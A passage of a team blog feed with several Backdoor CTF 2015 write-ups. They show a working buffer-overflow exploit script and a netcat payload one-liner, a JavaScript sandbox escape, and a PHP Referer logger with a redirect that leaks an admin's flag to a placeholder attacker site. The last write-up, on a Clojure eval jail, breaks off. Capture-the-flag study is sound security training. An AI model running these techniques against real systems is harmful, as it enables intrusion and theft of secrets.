<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "GeeksSpeak\n"+"A"*40+"\n"' &gt; forgot.test
</span><span class='line'>hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ cat forgot.test 
</span><span class='line'>GeeksSpeak
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ ./forgot &lt; forgot.test 
</span><span class='line'>What is your name?
</span><span class='line'>&gt; 
</span><span class='line'>Hi GeeksSpeak
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>                        Finite-State Automaton
</span><span class='line'>
</span><span class='line'>I have implemented a robust FSA to validate email addresses
</span><span class='line'>Throw a string at me and I will let you know if it is a valid email address
</span><span class='line'>
</span><span class='line'>                                Cheers!
</span><span class='line'>
</span><span class='line'>I should give you a pointer perhaps. Here: 8048654
</span><span class='line'>
</span><span class='line'>Enter the string to be validate
</span><span class='line'>Segmentation fault (core dumped)
</span></code></pre></td></tr></table></div></figure>


<p>and <code>gdb</code> proves this too. but how should i read the flag? do we need ROP? or something simillar? i started dumping strings in IDA and located these:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.rodata:08048D9F 00000007 C ./flag
</span><span class='line'>.rodata:08048DA6 00000007 C cat %s</span></code></pre></td></tr></table></div></figure>


<p>these strings had been used in <code>0x080486CC</code> and finding a call system proves that like ECHO we should just using this function as RET.</p>

<p>by using this piece of code we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">delim</span><span class="o">=</span><span class="s">&#39;&gt; &#39;</span><span class="p">):</span>
</span><span class='line'>    <span class="n">data</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>    <span class="k">while</span> <span class="ow">not</span> <span class="n">data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">+=</span> <span class="n">c</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">u</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;hack.bckdr.in&#39;</span><span class="p">,</span> <span class="mi">8009</span><span class="p">))</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">makefile</span><span class="p">(</span><span class="s">&#39;rw&#39;</span><span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;A</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x80486CC</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="n">sol</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="p">[</span><span class="n">redacted</span><span class="p">]</span>
</span><span class='line'><span class="o">***</span> <span class="n">Connection</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span> <span class="o">***</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve got the flag. 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - CONCEALED Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/"/>
    <updated>2015-04-03T02:33:31+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 CONCEALED Writeup</strong><br/>
<strong>Point = 150</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>All paths have been concealed. Get the hidden flag: nc hack.bckdr.in 8005. Submit sha-256 of the flag</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc hack.bckdr.in 8005
</span><span class='line'>######################################
</span><span class='line'>####           CONCEAL            ####
</span><span class='line'>######################################
</span><span class='line'>
</span><span class='line'>Welcome to CONCEAL
</span><span class='line'>You have access to object named sandboxed and its functions 
</span><span class='line'>Rest everything is sandboxed, don't be a jerk and break something
</span><span class='line'>Wrap your code in a function and return what you want as output
</span><span class='line'>Flag is hidden somewhere in the code. 
</span><span class='line'>Get the flag :D!
</span><span class='line'>
</span><span class='line'>home@jail:$ 
</span></code></pre></td></tr></table></div></figure>


<p>First of all as banner says we should use all our payload as a function like :</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return "GeeksSpeak"; }
</span><span class='line'>GeeksSpeak
</span><span class='line'>home@jail:$ </span></code></pre></td></tr></table></div></figure>


<p>After some diging into the the challenge, trying to break the jail and so on, reading banner carefully indicates that the flag is in the code so i should read codes but how?</p>

<p>In javascript we can use arguments.caller to see which function calls our current function so i made up an example and tested it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return exploit.caller.toString(); }
</span><span class='line'>function () {return (function exploit() { return exploit.caller.toString(); })()}
</span><span class='line'>home@jail:$ function exploit() { return (exploit.caller).caller.toString(); }
</span><span class='line'>function () {
</span><span class='line'>        if (!(this instanceof Script)) {
</span><span class='line'>          throw new TypeError('invalid call to ' + f);
</span><span class='line'>        }
</span><span class='line'>        return ns[f].apply(ns, arguments);
</span><span class='line'>      }
</span><span class='line'>home@jail:$ 
</span></code></pre></td></tr></table></div></figure>


<p>this proved my idea, so i used caller repeatedly and finally got the flag as bellow:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
</span><span class='line'>function (err, line) {
</span><span class='line'>
</span><span class='line'>    // flag : [redacted]
</span><span class='line'>
</span><span class='line'>    if (err && wait === false) {
</span><span class='line'>      return callback(err);
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    var against = {},
</span><span class='line'>        numericInput,
</span><span class='line'>        isValid;
</span><span class='line'>
</span><span class='line'>    if (line !== '') {
</span><span class='line'>      if (schema.properties[propName]) 
</span><span class='line'>      [..stripped..]</span></code></pre></td></tr></table></div></figure>


<p>and sha256 of the <code>[redacted]</code> gives us another 150pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - ECHO Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/"/>
    <updated>2015-04-03T02:12:58+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 ECHO Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Binary</strong></p>

<blockquote><p>Little Suzie started learning C. She created a simple program that echo&rsquo;s back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file echo
</span><span class='line'>echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=15ec07e5664a13e94069c818141cc9f70591d0f0, not stripped</span></code></pre></td></tr></table></div></figure>


<p>As it seems we have a 32bit binary as a ECHO server. the output confirms this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc hack.bckdr.in 8002
</span><span class='line'>GeeksSpeak
</span><span class='line'>ECHO: GeeksSpeak</span></code></pre></td></tr></table></div></figure>


<p>opening the binary in IDA shows us that the main function calls test() as we can see the psuedo-code below :</p>

<!-- more -->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int test()
</span><span class='line'>{
</span><span class='line'>  char s; // [sp+1Eh] [bp-3Ah]@1
</span><span class='line'>
</span><span class='line'>  gets(&s);
</span><span class='line'>  return fprintf(_bss_start, "ECHO: %s\n", &s);
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s an obvious Stack buffer overflow. without loosing time i loaded it into <em>gdb</em> and used  cyclic pattern to find the offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb ./echo -q
</span><span class='line'>Reading symbols from ./echo...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ pattern_create 100
</span><span class='line'>'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
</span><span class='line'>gdb-peda$ shell echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' &gt; echo.test
</span><span class='line'>gdb-peda$ r &lt; echo.test 
</span><span class='line'>Starting program: /home/hamidx9/ctf/backdoor/echo &lt; echo.test
</span><span class='line'>ECHO: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[-----------------------------------------------------------------------------------------------------------registers-----------------------------------------------------------------------------------------------------------]
</span><span class='line'>EAX: 0x6b (b'k')
</span><span class='line'>EBX: 0xf7fae000 --&gt; 0x1a8da8 
</span><span class='line'>ECX: 0x6b (b'k')
</span><span class='line'>EDX: 0xf7faf86c --&gt; 0x0 
</span><span class='line'>ESI: 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x41324141 (b'AA2A')
</span><span class='line'>ESP: 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
</span><span class='line'>EIP: 0x41414841 (b'AHAA')
</span><span class='line'>[-------------------------------------------------------------------------------------------------------------code--------------------------------------------------------------------------------------------------------------]
</span><span class='line'>Invalid $PC address: 0x41414841
</span><span class='line'>[-------------------------------------------------------------------------------------------------------------stack-------------------------------------------------------------------------------------------------------------]
</span><span class='line'>00:0000| esp 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
</span><span class='line'>01:0004|     0xffffcdd4 ("AAIAAeAA4AAJAAf"...)
</span><span class='line'>02:0008|     0xffffcdd8 ("AeAA4AAJAAfAA5A"...)
</span><span class='line'>03:0012|     0xffffcddc ("4AAJAAfAA5AAKAA"...)
</span><span class='line'>04:0016|     0xffffcde0 ("AAfAA5AAKAAgAA6"...)
</span><span class='line'>05:0020|     0xffffcde4 ("A5AAKAAgAA6AAL")
</span><span class='line'>06:0024|     0xffffcde8 ("KAAgAA6AAL")
</span><span class='line'>07:0028|     0xffffcdec ("AA6AAL")
</span><span class='line'>[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]
</span><span class='line'>Legend: stack, code, data, heap, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414841 in ?? ()
</span><span class='line'>gdb-peda$ pattern_offset 'AHAA'
</span><span class='line'>AHAA found at offset: 62
</span><span class='line'>gdb-peda$ 
</span></code></pre></td></tr></table></div></figure>


<p>So the <code>offset = 62</code>. but where should we jump? IDA shows us there is another function named <code>sample</code> which open <code>flag.txt</code> and print its content. All have to do is to call <code>sample</code> with address = <em>0x0804854d</em>.</p>

<p>Final payload looks like below :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[A*62] + [0x0804854d in little endian]</span></code></pre></td></tr></table></div></figure>


<p>And finally we&rsquo;ve got the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
</span><span class='line'>ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
</span><span class='line'>[redacted]</span></code></pre></td></tr></table></div></figure>


<p>And another 100 pt.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - Medusa Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup/"/>
    <updated>2015-04-03T01:06:09+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor2015 Medusa Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Web</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>The html page you create will be visited by the backdoor admin with the flag.
You can enter a fake flag to simulate the challenge.</p>

<p>Get the flag at <a href="http://hack.bckdr.in/MEDUSA/">http://hack.bckdr.in/MEDUSA/</a></p></blockquote>

<p>After We open the link that is provided in description we are welcomed with a form.you can send message with html code and after that admin will visit your page with the flag.</p>

<!-- more -->


<p><img src="http://up.ashiyane.org/images/nxcfynwxymxjqi2v4u7.png" title="Medusa Form" alt="alt text" /></p>

<p>Backdoor CTF admin add a hint and mention that they sent flag as post request</p>

<p>this is sample request that admin sent :</p>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG">http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG</a></p>

<p>when you sent the message Medusa website create id for you.
you can visit your message with this id ( same as admin :D )</p>

<p><img src="http://up.ashiyane.org/images/wu0fm2e5n6shme48fj58.png" title="Message Read" alt="alt text" /></p>

<p>we test different method to get the flag value from post request with PHP or JavaScript in our page but we see error or blank page.</p>

<blockquote><p>after some investigation our team found answer !!!</p></blockquote>

<p>we can redirect admin to another page and get the flag</p>

<p>but if they sent request as post cant log the value in second page.so thinking to Referer attribute in the header.</p>

<p>write some code to get and save the Referer in the text file when admin redirect to our PHP page :
Server.php</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>$ref = $_SERVER['HTTP_REFERER'];
</span><span class='line'>file_put_contents("flag.txt",$ref);
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<blockquote><p>and sent this code as our page to Medusa form :</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---
</span><span class='line'>location: http://Attackerwebsite.com/server.php
</span><span class='line'>---
</span><span class='line'>Can you get the **flag**?</span></code></pre></td></tr></table></div></figure>


<p>but after admin visit the link flag.txt is empty !!!</p>

<p>no Referer sent to PHP page&hellip;</p>

<p>we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt</p>

<p>after some research we found out with this kind of header redirection we cant get Referer and we should change that.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---
</span><span class='line'>Refresh: 0; url=http://Attackerwebsite.com/server.php
</span><span class='line'>---
</span><span class='line'>Can you get the **flag**?
</span></code></pre></td></tr></table></div></figure>


<p>and guess what?</p>

<blockquote><p>we have Referer Link in flag.txt :D</p></blockquote>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?flag=[redacted]&amp;id=d61d051c6e741595491c">Referer Link With Flag!</a></p>

<p>and now you have 100 point :D</p>

<p>WriteUp By Fr0nk</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - Noname Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/"/>
    <updated>2015-04-03T00:42:36+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can&rsquo;t get the flag. Can you? Visit <a href="https://agile-garden-1672.herokuapp.com/">this</a>. Submit the SHA-256 hash of the flag obtained.</p>

<p>Welcome to Noname! You can see an intrepreter above
Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined
Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined</p></blockquote>

<p>We could see  see an intrepreter like this :</p>

<!-- more -->


<p><img src="http://up.ashiyane.org/images/7f689wqyxbbwiaxbwl.png" alt="enter image description here" />
so first for testing script give &ldquo;1&rdquo; as input it will retrun &ldquo;1&rdquo; again ..
lets check whats going on in browser run firebug and check :</p>

<p><img src="http://up.ashiyane.org/images/2fmqsv03ko2qatsw10tq.png" alt="enter image description here" /></p>

<p>Its using JSON with eval.json at this <a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=1">LINK</a> .
Lets see whats happen if we execute our codes directly :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=*">https://agile-garden-1672.herokuapp.com/eval.json?expr=*</a>
And the response :</p>

<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;*&rdquo;,&ldquo;result&rdquo;:&ldquo;#&lt;core$<em>STAR</em> clojure.core$<em>STAR</em>@5ca69ca5>&rdquo;}
 cool , Its Clojure and * is built-in function in &ldquo;clojure.core&rdquo;
 lets google clojure.core and find all functions of this library :
<a href="http://clojure.github.io/clojure/clojure.core-api.html">http://clojure.github.io/clojure/clojure.core-api.html</a>
this link has all built-in functions of this library . after little searching found (loaded-libs) function .
more googling about clojure i understood that for using function out syntax shoud be like
(function) . for loaded-libs it should be (loaded-libs) and response :</p>

<p>   {&ldquo;expr&rdquo;:&ldquo;(loaded-libs)&rdquo;,&ldquo;result&rdquo;:&ldquo;#{bultitude.core cheshire.core cheshire.factory cheshire.generate cheshire.parse clj-time.core clj-time.format clj-yaml.core clojail.core clojail.jvm clojail.testers clojure.core.cache clojure.core.incubator clojure.core.memoize clojure.data.priority-map clojure.java.io clojure.main clojure.repl clojure.set clojure.stacktrace clojure.string clojure.template clojure.test clojure.tools.macro clojure.tools.reader clojure.tools.reader.default-data-readers clojure.tools.reader.edn clojure.tools.reader.impl.ExceptionInfo clojure.tools.reader.impl.commons clojure.tools.reader.impl.utils clojure.tools.reader.reader-types clojure.walk clout.core compojure.core compojure.handler compojure.response compojure.route flatland.useful.fn flatland.useful.seq flatland.useful.utils hiccup.compiler hiccup.core hiccup.def hiccup.element hiccup.middleware hiccup.page hiccup.util noir.cookies noir.request noir.response noir.session noir.util.crypt noir.util.middleware noir.validation noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home ring.adapter.jetty ring.middleware.content-type ring.middleware.cookies ring.middleware.file-info ring.middleware.flash ring.middleware.format ring.middleware.format-params ring.middleware.format-response ring.middleware.head ring.middleware.keyword-params ring.middleware.multipart-params ring.middleware.multipart-params.temp-file ring.middleware.nested-params ring.middleware.params ring.middleware.session ring.middleware.session.memory ring.middleware.session.store ring.util.codec ring.util.io ring.util.mime-type ring.util.response ring.util.servlet ring.util.time serializable.fn}&rdquo;}</p></blockquote>

<p>Found good things :</p>

<pre><code>noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home
</code></pre>

<p>specialy &ldquo;noname.people.admin&rdquo; because of hint of question:</p>

<blockquote><p>Remember admin is one of the people</p></blockquote>

<p>Its loaded , so we can use it in our codes but we dont know functions and classes
little googling found &ldquo;clojure.repl/dir&rdquo; it can list classes , functions &hellip; :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28clojure.repl/dir%20noname.people.admin%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=(clojure.repl/dir noname.people.admin)</a></p>

<p>and response :</p>

<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;(clojure.repl/dir noname.people.admin)&rdquo;,&ldquo;result&rdquo;:&ldquo;flag\nnil&rdquo;}</p></blockquote>

<p>oh . &ldquo;flag&rdquo; &hellip;. lets check if its public :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29</a></p>

<p> yes , its public , we can use it in interpreter :
<img src="http://up.ashiyane.org/images/b95z537owt2a0cmrm1ca.png" alt="enter image description here" /></p>

<p> got second part of flag :</p>

<pre><code>Give me some code:
</code></pre>

<blockquote><p>(noname.people.admin/flag)
Ma flag is : _b7w_1_l1k3_60l4n6_700nil</p></blockquote>

<p>We need first part of flag called admin&rsquo;s secret , let test  (noname.people.admin/secret)
and response id error :</p>

<blockquote><p>   {&ldquo;error&rdquo;:true,&ldquo;message&rdquo;:&ldquo;java.lang.IllegalStateException: var: noname.people.admin/secret is not public&rdquo;}</p></blockquote>

<p>it private , and because of namespace we cant use it also we cant switch our namespace becuase &ldquo;ns&rdquo; is closed by Java.Security&hellip;</p>

<p>lets google and find a way for bypass :)
found this <a href="http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions">http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions</a></p>

